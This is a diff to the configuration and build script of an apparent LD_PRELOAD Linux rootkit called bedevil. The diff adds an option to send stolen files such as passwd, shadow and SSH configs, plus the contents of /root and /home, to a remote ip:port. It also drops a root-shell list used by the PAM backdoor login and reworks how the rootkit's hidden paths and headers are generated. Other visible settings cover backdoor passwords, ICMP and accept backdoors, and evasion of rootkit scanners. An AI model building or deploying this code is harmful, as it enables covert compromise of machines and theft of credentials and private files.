@@ -85,6 +85,11 @@ INTERESTING_FILES  = ['passwd', 'shadow', 'sshd_config', 'ssh_config', 'ssh_host
 # all files in these directories will be stolen when opened. can be disabled.
 INTERESTING_DIRECTORIES = ['/root', '/home']
 
+# instead of storing files in our hidden directory on the box, prioritise sending them here...
+# see etc/hoarder. format for this is ip:port - can be changed after installation... (can be disabled/is disabled by default)
+STOLEN_STORAGE = ''
+NO_DISK_WRITE  = False # if True & the file can't be sent for whatever reason, the file will not be copied into the hidden directory.
+
 # when stealing files ignore these filenames. wildcards apply. can be disabled. is by default.
 NAMES_BLACKLIST = []
 
@@ -164,28 +169,23 @@ scary_procs = ['chkrootkit', 'lsrootkit', 'ldd', 'unhide', 'rkhunter',
 # valid platforms for target shared object when installing. (`./bdvinstall [path]...`)
 valid_platforms = ['x86_64', 'i686', 'v6l', 'v7l']
 
-# when su'ing to root on PAM backdoor login, the rootkit will make sure one of these shells
-# are dropped, in order, if it exists. regardless of the root user's real login shell. or lack thereof.
-goodshells = ['/bin/bash', '/bin/sh']
-
 
 
 
 from crypt import crypt
-from shutil import copytree
+from shutil import copy
 from base64 import b64encode
 from string import ascii_uppercase, ascii_lowercase, digits
 from random import choice
 from os import listdir, system, unlink, mkdir
-from os.path import basename, isdir
+from os.path import basename, isdir, exists
 from binascii import hexlify
-from sys import argv
-
-if(len(argv) < 2):
-    print('Missing argument: NEW_INC')
-    quit()
 
 alowercase, auppercase = ascii_lowercase, ascii_uppercase
+
+
+
+
 
 class Hooks():
     def __init__(self):
@@ -346,12 +346,6 @@ class Util():
         contentsarr = CArray(arrname, contentslist, arrtype='char')
         return contentsarr.create()
 
-    def sogetplainpath(self, instdir, soname):
-        return '{0}/{1}'.format(instdir, soname)
-
-    def sogetpath(self, instdir, soname):
-        return '{0}/{1}.$PLATFORM'.format(instdir, soname)
-
     def sogetname(self, instdir):
         return 'lib'+basename(instdir)+'.so'
 
@@ -434,30 +428,30 @@ INSTALL_DIR = ut.randpath(14)
 BDVLSO = ut.sogetname(INSTALL_DIR)
 CLEANEDTIME_PATH = ut.randpath(12) if not FILE_CLEANSE_TIMER == None else None
 
-INC, NEW_INC = 'inc', argv[1]
-CONFIGH      = NEW_INC + '/config.h'
-HOOKS_PATH   = NEW_INC + '/hooks/libdl/hooks' # list of everything we're hooking & the libraries they originate from.
+INC        = 'inc'
+CONFIGH    = INC + '/config.h'
+HOOKS_PATH = INC + '/hooks/libdl/hooks' # list of everything we're hooking & the libraries they originate from.
 
-BDVLH = NEW_INC + '/bedevil.h'
+BDVLH = INC + '/bedevil.h'
 SETTINGS = { # all of these are written to bedevil.h. if a value is None it is skipped.
     'PAM_UNAME':PAM_UNAME,                   'BACKDOOR_PASS':ut.cryptpw(BACKDOOR_PASS),
     'MAGIC_GID':MAGIC_GID,                   'BD_VAR':ut.randgarb(auppercase, 16),
     'INSTALL_DIR':INSTALL_DIR,               'HOMEDIR':ut.randpath(17),
-    'BDVLSO':BDVLSO,                         'SOPATH':ut.sogetpath(INSTALL_DIR, BDVLSO),
-    'PRELOAD_FILE':ut.randpath(18),          'SSH_LOGS':ut.randpath(14),
-    'INTEREST_DIR':ut.randpath(17),          'HIDEPORTS':ut.randpath(17),
-    'GID_PATH':ut.randpath(15),              'GIDTIME_PATH':ut.randpath(16),
-    'SSHD_CONFIG':'/etc/ssh/sshd_config',    'LOG_PATH':ut.randpath(15),
-    'ASS_PATH':ut.randpath(16),              'MAX_FILE_SIZE':MAX_FILE_SIZE,
-    'FILE_CLEANSE_TIMER':FILE_CLEANSE_TIMER, 'CLEANEDTIME_PATH':CLEANEDTIME_PATH,
-    'OLD_PRELOAD':'/etc/ld.so.preload',      'BLOCKS_COUNT':BLOCKS_COUNT,
-    'MAX_BLOCK_SIZE':MAX_BLOCK_SIZE,         'GID_CHANGE_MINTIME':GID_CHANGE_MINTIME,
-    'LOG_FMT':LOG_FMT,                       'MAX_STEAL_SIZE':MAX_STEAL_SIZE,
-    'MAX_GID':MAX_GID,                       'MIN_GID':MIN_GID,
-    'TARGET_INTERFACE':TARGET_INTERFACE,     'MAGIC_ID':MAGIC_ID,
-    'MAGIC_SEQ':MAGIC_SEQ,                   'MAGIC_ACK':MAGIC_ACK,
-    'EXEC_LOGS':ut.randpath(17),             'HIDEADDRS':ut.randpath(16),
-    'MAX_LOGS_SIZE':MAX_LOGS_SIZE
+    'BDVLSO':BDVLSO,                         'PRELOAD_FILE':ut.randpath(18),
+    'SSH_LOGS':ut.randpath(14),              'INTEREST_DIR':ut.randpath(17),
+    'HIDEPORTS':ut.randpath(17),             'GID_PATH':ut.randpath(15),
+    'GIDTIME_PATH':ut.randpath(16),          'SSHD_CONFIG':'/etc/ssh/sshd_config',
+    'LOG_PATH':ut.randpath(15),              'ASS_PATH':ut.randpath(16),
+    'MAX_FILE_SIZE':MAX_FILE_SIZE,           'FILE_CLEANSE_TIMER':FILE_CLEANSE_TIMER,
+    'CLEANEDTIME_PATH':CLEANEDTIME_PATH,     'OLD_PRELOAD':'/etc/ld.so.preload',
+    'BLOCKS_COUNT':BLOCKS_COUNT,             'MAX_BLOCK_SIZE':MAX_BLOCK_SIZE,
+    'GID_CHANGE_MINTIME':GID_CHANGE_MINTIME, 'LOG_FMT':LOG_FMT,
+    'MAX_STEAL_SIZE':MAX_STEAL_SIZE,         'MAX_GID':MAX_GID,
+    'MIN_GID':MIN_GID,                       'TARGET_INTERFACE':TARGET_INTERFACE,
+    'MAGIC_ID':MAGIC_ID,                     'MAGIC_SEQ':MAGIC_SEQ,
+    'MAGIC_ACK':MAGIC_ACK,                   'EXEC_LOGS':ut.randpath(17),
+    'HIDEADDRS':ut.randpath(16),             'MAX_LOGS_SIZE':MAX_LOGS_SIZE,
+    'STOLESTORE_PATH':ut.randpath(17)
 }
 
 # the following paths are linked to within the installation directory.
@@ -466,7 +460,8 @@ LINKPATHS = {
     SETTINGS['SSH_LOGS']:'ssh_logs',         SETTINGS['HIDEPORTS']:'hide_ports',
     SETTINGS['INTEREST_DIR']:'interest_dir', SETTINGS['LOG_PATH']:'auth_logs',
     SETTINGS['ASS_PATH']:'my_ass',           SETTINGS['INSTALL_DIR']:'install_dir',
-    SETTINGS['EXEC_LOGS']:'exec_logs',       SETTINGS['HIDEADDRS']:'hide_addrs'
+    SETTINGS['EXEC_LOGS']:'exec_logs',       SETTINGS['HIDEADDRS']:'hide_addrs',
+    SETTINGS['STOLESTORE_PATH']:'stolen_store'
 }
 
 # these must be checked & based on the values, subsequently written to config.h
@@ -481,7 +476,8 @@ CHECKTHESE = {
     'SYMLINK_ONLY':SYMLINK_ONLY,                 'USE_PAM_BD':USE_PAM_BD,
     'USE_ICMP_BD':USE_ICMP_BD,                   'HIDE_MY_ASS':HIDE_MY_ASS,
     'USE_ACCEPT_BD':USE_ACCEPT_BD,               'LOG_USER_EXEC':LOG_USER_EXEC,
-    'ORIGINAL_RW_FALLBACK':ORIGINAL_RW_FALLBACK, 'HIDE_ADDRS':ut.checkthing(HIDDEN_IP_ADDRS)
+    'ORIGINAL_RW_FALLBACK':ORIGINAL_RW_FALLBACK, 'HIDE_ADDRS':ut.checkthing(HIDDEN_IP_ADDRS),
+    'NO_DISK_WRITE':NO_DISK_WRITE
 }
 
 # paths here suffixed with a '/' are treated as directories by the rootkit.
@@ -506,8 +502,7 @@ NOTRACK = {  # stuff that HIDE_MY_ASS does not need to track.
 }
 
 PATCHLISTS = { # stuff for ldpatch
-    'patchtargets':PATCH_TARGETS, 'antival':ANTIVAL,
-    'targetval':TARGETVAL
+    'patchtargets':PATCH_TARGETS, 'antival':ANTIVAL, 'targetval':TARGETVAL
 }
 
 
@@ -536,7 +531,7 @@ def listconditional(dictlist):
 
 
 def setup_config():
-    copytree(INC, NEW_INC)
+    copy(CONFIGH+'.bak', CONFIGH)
     writecfg()
 
     h = Hooks()
@@ -584,6 +579,9 @@ def setup_config():
             namesarr = CArray('namesblacklist', NAMES_BLACKLIST)
             gotbdvlh += namesarr.create()
 
+        if not STOLEN_STORAGE == None and not len(STOLEN_STORAGE) == 0:
+            gotbdvlh += '#define STOLEN_STORAGE "{0}"\n'.format(STOLEN_STORAGE)
+
     linksrc = list(LINKPATHS.keys())
     linkdest = list(LINKPATHS.values())
 
@@ -593,7 +591,7 @@ def setup_config():
         'notrack':listconditional(NOTRACK), 'validpkgmans':validpkgmans,
         'scary_variables':scary_variables,  'scary_paths':scary_paths,
         'scary_procs':scary_procs,          'valid_platforms':valid_platforms,
-        'all':h.ALL_HOOKS,                  'goodshells':goodshells
+        'all':h.ALL_HOOKS
     }
 
     arraynames = list(bdvlarrays.keys())
@@ -625,7 +623,7 @@ def setup_config():
         fd.close()
 
     # mk tar.gz of include dir. b64 it. rm it.
-    system('tar cpfz ./build/{0}.tar.gz {1}/'.format(PAM_UNAME, NEW_INC))
+    system('tar cpfz ./build/{0}.tar.gz {1}/'.format(PAM_UNAME, INC))
     with open('./build/'+PAM_UNAME+'.tar.gz', 'rb') as fd:
         targzb64 = b64encode(fd.read())
         fd.close()
@@ -636,18 +634,7 @@ def setup_config():
         fd.write(targzb64)
         fd.close()
 
-
-
-
-if __name__ == '__main__':
-    if isdir(NEW_INC):
-        print('Directory {0} already exists. Not doing setup again.'.format(NEW_INC))
-        quit()
-
-    if not isdir('./build'):
-        mkdir('./build')
-
-
+def rewritethings():
     if REWRITE_BASHRC == True:
         basharr = ut.hexarraylifypath('etc/.bashrc', 'rkbashrc')
         with open(INC+'/util/magic/bashrc.h', 'w') as fd:
@@ -663,6 +650,14 @@ if __name__ == '__main__':
             fd.write(rolfarr.create())
             fd.close()
 
+
+
+if __name__ == '__main__':
+    if exists(CONFIGH):
+        print('Config header ({0}) already exists. Not doing setup again.'.format(CONFIGH))
+        quit()
+
+    rewritethings()
     setup_config()
 
     print('')
